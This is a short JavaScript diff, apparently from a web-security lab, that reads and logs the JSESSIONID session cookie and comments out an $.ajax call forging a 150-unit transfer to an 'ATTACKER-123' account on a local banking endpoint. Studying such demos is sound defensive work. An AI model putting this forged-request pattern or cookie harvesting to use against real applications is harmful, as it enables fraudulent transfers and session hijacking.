@@ -1,9 +1,8 @@
 $(function () {
 	
 	
-	console.log($.cookie("JSESSIONID"));
+	console.log("JSESSIONID: " + $.cookie("JSESSIONID"));
 	var jsessionid = 'JSESSIONID=' + $.cookie("JSESSIONID");
-	console.log(jsessionid);
 	
 	/**
 	 $.post("http://localhost:9090/transfert?noDebiteur=ATTACKER-123&montant=150", function(data, status){
@@ -11,6 +10,7 @@ $(function () {
 	});
 	*/
 	
+	/**
 	$.ajax({
         url: 'http://localhost:9090/transfert?noDebiteur=ATTACKER-123&montant=150',
         dataType: 'text',
@@ -30,5 +30,5 @@ $(function () {
             console.log( errorThrown );
         }
     });
-	
+	*/
 })
